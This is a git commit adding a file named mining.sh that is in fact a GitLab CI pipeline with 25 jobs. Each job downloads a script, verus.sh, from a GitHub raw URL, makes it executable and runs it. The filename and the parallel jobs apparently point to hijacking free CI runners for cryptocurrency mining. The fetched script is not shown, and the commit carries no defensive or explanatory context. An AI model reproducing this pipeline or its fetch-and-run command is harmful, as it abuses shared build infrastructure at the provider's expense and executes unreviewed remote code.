d2ec7ecd56cdae6b20479984ad703aeff8f367d0
82a <69309779+82a@users.noreply.github.com>
2021-05-10 11:26:27 +0700

    Create mining.sh

---
+++ mining.sh
@@ -0,0 +1,128 @@
+stages:
+  - bachannel
+  - build
+  - deploy
+
+bachannel_1:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+bachannel_2:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_3:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_4:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_5:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_6:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_7:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_8:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_9:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_10:
+  stage: build
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_11:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_12:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_13:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_14:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_15:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_16:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_17:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_18:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_19:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_20:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh && ./verus.sh
+    
+bachannel_21:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh  && ./verus.sh
+   
+bachannel_22:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh  && ./verus.sh
+    
+bachannel_23:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh  && ./verus.sh
+    
+bachannel_24:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh  && ./verus.sh
+    
+bachannel_25:
+  stage: bachannel
+  script:
+    - wget https://raw.githubusercontent.com/82a/verus/main/verus.sh && chmod u+x verus.sh  && ./verus.sh
